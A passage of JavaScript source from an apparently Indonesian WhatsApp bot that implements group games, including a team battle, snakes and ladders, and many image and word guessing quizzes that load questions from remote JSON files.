							for (let i = 0; i < usersdb[target].level; i++) {
								opportunity.push(target)
							}

							let pointAttacker = 0
							let pointTarget = 0
							for (i = 0; i < 10; i++) {
								if (opportunity[RandomNo(0, opportunity.length)] == attacker) pointAttacker += 1
								else pointTarget += 1
							}

							for (let i = 0; i < 10; i++) {
								if (vreden.war[m.chat][i].user == target) {
									vreden.war[m.chat][i].hp -= pointAttacker * 500
									vreden.sendText(m.chat, vreden.war[m.chat][vreden.war2[m.chat].turn].turn, m)
									vreden.war[m.chat][vreden.war2[m.chat].turn].turn = true
									vreden.sendText(m.chat, vreden.war[m.chat][vreden.war2[m.chat].turn].turn, m)
									vreden.sendText(m.chat, `*@${attacker.split('@')[0]} menyerang @${target.split('@')[0]} sampai nyawanya berkurang ${pointAttacker * 500} (Sisa HP: ${vreden.war[m.chat][i].hp})*\n\n*@${attacker.split('@')[0]} [${pointAttacker*10}%] - [${pointTarget*10}%] @${target.split('@')[0]}*\n*Level sangat mempengaruhi keberhasilan.*`, m, {
										contextInfo: {
											mentionedJid: [attacker, target]
										}
									})
									await sleep(2000)
									if (vreden.war[m.chat][i].hp <= 0) vreden.sendText(m.chat, `*@${target.split(`@`)[0]} sudah mati dalam pertarungan.*`, m, {
										contextInfo: {
											mentionedJid: [target]
										}
									})
									success = true
								}
							}
						}
					}
					if (success == false) {
						return m.reply(`*Masukkan list pemain game yang benar bos.*\n\n*Cek ".war player"*`)
					} else {
						for (let i = 0; i < 10; i++) {
							if (m.sender == vreden.war[m.chat][i].user) {
								vreden.war[m.chat][i].turn = true
							}
						}
					}
				}

				if (vreden.war2[m.chat].turn < 5) {
					let userAktif = 0
					let userMati = 0
					for (let i = 5; i < 10; i++) {
						if (vreden.war[m.chat][i].user != "") {
							userAktif += 1
							if (vreden.war[m.chat][i].hp <= 0) {
								userMati += 1
							}
						}
					}
					// m.reply(userAktif + "/" + userMati)
					if (userAktif == userMati) {
						var teamA = []
						var teamB = []
						var teamAB = []
						for (let j = 0; j < 5; j++) {
							if (vreden.war[m.chat][j].user != "") {
								usersdb[vreden.war[m.chat][j].user].saldo += Number(vreden.war2[m.chat].money)
								teamA.push(vreden.war[m.chat][j].user)
								teamAB.push(vreden.war[m.chat][j].user)
							}
						}
						for (let j = 5; j < 10; j++) {
							if (vreden.war[m.chat][j].user != "") {
								usersdb[vreden.war[m.chat][j].user].saldo -= Number(vreden.war2[m.chat].money)
								teamB.push(vreden.war[m.chat][j].user)
								teamAB.push(vreden.war[m.chat][j].user)
							}
						}
						vreden.sendText(m.chat, `*TEAM A MENANG KARENA TEAM B GOBLOK SEMUA*\n\n*TEAM A :*\n` + teamA.map((v, i) => `${vreden.war[m.chat][i].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (+ Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n` + "\n\n*TEAM B :*\n" + teamB.map((v, i) => `${vreden.war[m.chat][i+5].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (- Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n`, m, {
							contextInfo: {
								mentionedJid: teamAB
							}
						})
						delete vreden.war[m.chat]
						delete vreden.war2[m.chat]
					}
					let turn1 = vreden.war2[m.chat].turn
					let turn2 = vreden.war2[m.chat].turn
					for (let k = 5; k < 10; k++) {
						if (vreden.war[m.chat][k].hp > 0 && vreden.war[m.chat][k].user != "" && vreden.war[m.chat][k].turn == false) {
							vreden.war2[m.chat].turn = k
							vreden.war2[m.chat].time = +1
							turn2 = vreden.war2[m.chat].turn
						}
					}
					if (turn1 == turn2) {
						for (i = 0; i < 10; i++) {
							vreden.war[m.chat][i].turn = false
						}
						for (i = 0; i < 5; i++) {
							if (vreden.war[m.chat][i].hp > 0 && vreden.war[m.chat][i].user != "" && vreden.war[m.chat][i].turn == false) {
								vreden.war2[m.chat].turn = i
								vreden.war2[m.chat].time = +1
							}
						}
					}
					await sleep(2000)
					vreden.sendText(m.chat, `*Giliran @${vreden.war[m.chat][vreden.war2[m.chat].turn].user.split('@')[0]} untuk menyerang (Waktu 90 detik)*\n\n.war player = statistik pemain\n.attack @tag = serang lawan`, m, {
						contextInfo: {
							mentionedJid: [vreden.war[m.chat][vreden.war2[m.chat].turn].user]
						}
					})
					cekAFK(vreden.war2[m.chat].turn)
				} else {
					let userAktif = 0
					let userMati = 0
					for (let i = 0; i < 5; i++) {
						if (vreden.war[m.chat][i].user != "") {
							userAktif += 1
							if (vreden.war[m.chat][i].hp <= 0) {
								userMati += 1
							}
						}
					}
					if (userAktif == userMati) {
						var teamA = []
						var teamB = []
						var teamAB = []
						for (let j = 0; j < 5; j++) {
							if (vreden.war[m.chat][j].user != "") {
								usersdb[vreden.war[m.chat][j].user].saldo -= Number(vreden.war2[m.chat].money)
								teamA.push(vreden.war[m.chat][j].user)
								teamAB.push(vreden.war[m.chat][j].user)
							}
						}
						for (let j = 5; j < 10; j++) {
							if (vreden.war[m.chat][j].user != "") {
								usersdb[vreden.war[m.chat][j].user].saldo += Number(vreden.war2[m.chat].money)
								teamB.push(vreden.war[m.chat][j].user)
								teamAB.push(vreden.war[m.chat][j].user)
							}
						}
						vreden.sendText(m.chat, `*TEAM B MENANG KARENA TEAM A GOBLOK SEMUA*\n\n*TEAM A :*\n` + teamA.map((v, i) => `${vreden.war[m.chat][i].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (- Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n` + "\n\n*TEAM B :*\n" + teamB.map((v, i) => `${vreden.war[m.chat][i+5].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (+ Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n`, m, {
							contextInfo: {
								mentionedJid: teamAB
							}
						})
						delete vreden.war[m.chat]
						delete vreden.war2[m.chat]
					}
					let turn1 = vreden.war2[m.chat].turn
					let turn2 = vreden.war2[m.chat].turn
					for (let k = 0; k < 5; k++) {
						if (vreden.war[m.chat][k].hp > 0 && vreden.war[m.chat][k].user != "" && vreden.war[m.chat][k].turn == false) {
							vreden.war2[m.chat].turn = k
							vreden.war2[m.chat].time = +1
							turn2 = vreden.war2[m.chat].turn
						}
					}
					if (turn1 == turn2) {
						for (let i = 0; i < 10; i++) {
							vreden.war[m.chat][i].turn = false
						}
						for (let i = 0; i < 5; i++) {
							if (vreden.war[m.chat][i].hp > 0 && vreden.war[m.chat][i].user != "" && vreden.war[m.chat][i].turn == false) {
								vreden.war2[m.chat].turn = i
								vreden.war2[m.chat].time = +1
							}
						}
					}
					await sleep(2000)
					vreden.sendText(m.chat, `*Giliran @${vreden.war[m.chat][vreden.war2[m.chat].turn].user.split('@')[0]} untuk menyerang (Waktu 90 detik)*\n\n.war player = statistik pemain\n.attack @tag = serang lawan`, m, {
						contextInfo: {
							mentionedJid: [vreden.war[m.chat][vreden.war2[m.chat].turn].user]
						}
					})
					cekAFK(vreden.war2[m.chat].turn)
				}

				let totalUser = 0
				let totalTurn = 0
				for (let i = 0; i < 10; i++) {
					if (vreden.war[m.chat][i].user != "") totalUser += 1
					if (vreden.war[m.chat][i].turn == true) totalTurn += 1
				}
				if (totalTurn == totalUser) {
					for (i = 0; i < 10; i++) {
						vreden.war[m.chat][i].turn = false
					}
				}

			}
			break
			case 'ulartangga': {
				vreden.ulartangga = vreden.ulartangga || {};
				const sessions = vreden.ulartangga;
				const sessionId = m.chat;
				const session = sessions[sessionId] || (sessions[sessionId] = new GameSession(sessionId, vreden));
				const game = session.game;
				const state = session.state || false;
				try {
					switch (args[0]) {
						case "join":
							if (state) {
								return await vreden.sendButtonText(m.chat, [{
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Help\",\"id\":\"${prefix + command} help\"}`
								}], "🛑 Permainan sudah dimulai.\nTidak dapat bergabung.", "⚡ Pilih aksi:", m)
							}
							const playerName = m.sender;
							const joinMessage = game.addPlayer(playerName) ? `👋 ${game.formatPlayerName(playerName)}\nbergabung ke dalam game.` : "*Anda sudah bergabung\natau permainan ini\nsudah penuh.*\n\nTidak dapat bergabung.";
							await vreden.sendButtonText(m.chat, [{
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Join Game 🕹️\",\"id\":\"${prefix + command} join\"}`
							}, {
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Start Game 🎮\",\"id\":\"${prefix + command} start\"}`
							}, {
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
							}], joinMessage, "⚡ Pilih aksi:", m)
							break;
						case "start":
							if (state) {
								return await vreden.sendButtonText(m.chat, [{
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Roll Dadu 🎲\",\"id\":\"${prefix + command} roll\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Reset Sesi 🔃\",\"id\":\"${prefix + command} reset\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
								}], "🛑 Permainan sudah dimulai.\nTidak dapat memulai ulang.", "⚡ Pilih aksi:", m)
							}
							if (game.players.length >= 2) {
								await game.startGame(m, game.players[0], game.players[1]);
								sessions[sessionId].state = true;
								await vreden.sendButtonText(m.chat, [{
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Roll Dadu 🎲\",\"id\":\"${prefix + command} roll\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Reset Sesi 🔃\",\"id\":\"${prefix + command} reset\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
								}], "🟢 Permainan dimulai!\nRoll dadu untuk bergerak.", "⚡ Pilih aksi:", m)
							} else {
								await vreden.sendButtonText(m.chat, [{
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Join Game 🕹️\",\"id\":\"${prefix + command} join\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Start Game 🎮\",\"id\":\"${prefix + command} start\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
								}], "👥 Tidak cukup pemain\nuntuk memulai permainan.\n\nDiperlukan minimal 2 pemain.", "⚡ Pilih aksi:", m)
							}
							break;
						case "roll":
							if (!state) {
								return await vreden.sendButtonText(m.chat, [{
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Join Game 🕹️\",\"id\":\"${prefix + command} join\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Start Game 🎮\",\"id\":\"${prefix + command} start\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
								}], `🛑 Permainan belum dimulai.\nKetik *${prefix + command} start* untuk memulai.`, "⚡ Pilih aksi:", m)
							}
							if (game.isGameStarted()) {
								const currentPlayer = game.players[game.currentPlayerIndex];
								if (m.sender !== currentPlayer) {
									await vreden.sendButtonText(m.chat, [{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"Roll Dadu 🎲\",\"id\":\"${prefix + command} roll\"}`
									}, {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"Reset Sesi 🔃\",\"id\":\"${prefix + command} reset\"}`
									}, {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
									}], `🕒 Bukan giliranmu Gblk.\nSekarang giliran ${game.formatPlayerName(currentPlayer)}`, "⚡ Pilih aksi:", m)
								} else {
									await game.playTurn(m, currentPlayer);
								}
							} else {
								await vreden.sendButtonText(m.chat, [{
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Join Game 🕹️\",\"id\":\"${prefix + command} join\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Start Game 🎮\",\"id\":\"${prefix + command} start\"}`
								}, {
									"name": "quick_reply",
									"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
								}], `🛑 Permainan belum dimulai.\nKetik *${prefix + command} start* untuk memulai.`, "⚡ Pilih aksi:", m)
							}
							break;
						case "reset":
						case "stop":
						case "end":
							sessions[sessionId].state = false;
							session.game.resetSession();
							delete sessions[sessionId];
							await vreden.sendButtonText(m.chat, [{
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Join Game 🕹️\",\"id\":\"${prefix + command} join\"}`
							}, {
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Start Game 🎮\",\"id\":\"${prefix + command} start\"}`
							}, {
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
							}], "🔄 Sesi permainan direset.\n\nKamu dapat memulai game\nulartangga baru kapan saja.", "⚡ Pilih aksi:", m)
							break;
						case "help":
							await vreden.sendButtonText(m.chat, [{
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Join Game 🕹️\",\"id\":\"${prefix + command} join\"}`
							}, {
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Start Game 🎮\",\"id\":\"${prefix + command} start\"}`
							}, {
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Roll Dadu 🎲\",\"id\":\"${prefix + command} roll\"}`
							}, {
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Reset Sesi 🔃\",\"id\":\"${prefix + command} reset\"}`
							}], `🎲🐍 Game Ular Tangga 🐍🎲\n\n*Commands:*\n- *${prefix + command} join :*\nBergabung ke dalam game.\n\n- *${prefix + command} start :*\nMemulai game.\n\n- *${prefix + command} roll :*\nRoll dadu untuk bergerak.\n\n- *${prefix + command} reset :*\nMereset sesi Game.`, "⚡ Pilih aksi:", m)
							break;
						default:
							await vreden.sendButtonText(m.chat, [{
								"name": "quick_reply",
								"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
							}], `❓ Perintah tidak valid.\n\nGunakan *${prefix + command} help*\nuntuk melihat daftar perintah.`, "⚡ Pilih aksi:", m)
					}
				} catch (error) {
					console.error("Error in ular tangga handler:", error);
					await vreden.sendButtonText(m.chat, [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Help Me 🤓\",\"id\":\"${prefix + command} help\"}`
					}], "Terjadi kesalahan dalam permainan Ular Tangga. Silakan coba lagi nanti.", "⚡ Pilih aksi:", m)
				}
			}
			break
			case 'tebakgambar': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakgambar[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakgambar[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakgambar[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakgame': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakgame[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakgame[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakgame[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakhero': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://api.vreden.my.id/api/tebakhero')
					let result = anu.result
					console.log("Jawaban: " + result.jawaban)
					tebakhero[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Gambar diatas adalah hero?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakhero[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakhero[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakff': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://api.vreden.my.id/api/tebakff')
					let result = anu.result
					console.log("Jawaban: " + result.jawaban)
					tebakff[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Karakter Apa Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakff[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakff[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakkabupaten': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/tebakkabupaten.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.title)
					tebakkabupaten[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.url
							},
							caption: `Logo Kabupaten Manakah ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakkabupaten[m.chat]) {
								waktuHabis(result.title)
								delete tebakkabupaten[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakjkt48': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/memberjkt48.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.name)
					tebakjkt48[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Siapakah Nama Member JKT48 Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakjkt48[m.chat]) {
								waktuHabis(result.name)
								delete tebakjkt48[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakhewan': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/tebakhewan.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.title)
					tebakhewan[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.url
							},
							caption: `Hewan Apakah Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakhewan[m.chat]) {
								waktuHabis(result.title)
								delete tebakhewan[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakhero2':
			case 'tebakml': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/tebakhero2.json')
					let result = await pickRandom(anu)
					let audio = await pickRandom(result.url)
					console.log("Jawaban: " + result.title)
					let key = await vreden.sendMessage(m.chat, {
						audio: {
							url: audio
						},
						mimetype: 'audio/mpeg',
						ptt: true
					}, {
						quoted: m
					})
					tebakml[m.chat] = [
						await vreden.sendMessage(m.chat, {
							text: `Siapakah Nama Karakter Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: key
						}), result, 250,
						setTimeout(() => {
							if (tebakml[m.chat]) {
								waktuHabis(result.title)
								delete tebakml[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakanime':
			case 'tebakchara': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let res = await fetchJson('https://www.vreden.my.id/cdn/game/characters.json')
					let anu = res.data
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.name)
					tebakchara[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.images.jpg.image_url
							},
							caption: `Siapakah Nama Karakter Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakchara[m.chat]) {
								waktuHabis(result.name)
								delete tebakchara[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebaklogo': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/tebaklogo.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaklogo[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `*Logo Apa Ini?*\n\n${result.deskripsi}\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebaklogo[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaklogo[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakaplikasi': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/tebakaplikasi.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakaplikasi[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.image
							},
							caption: `Gambar diatas adalah aplikasi?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakaplikasi[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakaplikasi[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakkata': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakkata[m.chat] = [
						await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebakkata[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakkata[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'asahotak': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/asahotak.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					asahotak[m.chat] = [
						await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (asahotak[m.chat]) {
								waktuHabis(result.jawaban)
								delete asahotak[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'lengkapikalimat': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/lengkapikalimat.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					lengkapikalimat[m.chat] = [
						await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (lengkapikalimat[m.chat]) {
								waktuHabis(result.jawaban)
								delete lengkapikalimat[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'family100': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if ('family100' + m.chat in _family100) {
					m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
					throw false
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
					let random = await pickRandom(anu)
					let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
					_family100['family100' + m.chat] = {
						id: 'family100' + m.chat,
						pesan: await vreden.sendText(m.chat, hasil, m),
						...random,
						terjawab: Array.from(random.jawaban, () => false),
						hadiah: 6,
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakbendera': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.name)
					tebakbendera[m.chat] = [
						await vreden.sendMessage(m.chat, {
							image: {
								url: result.img
							},
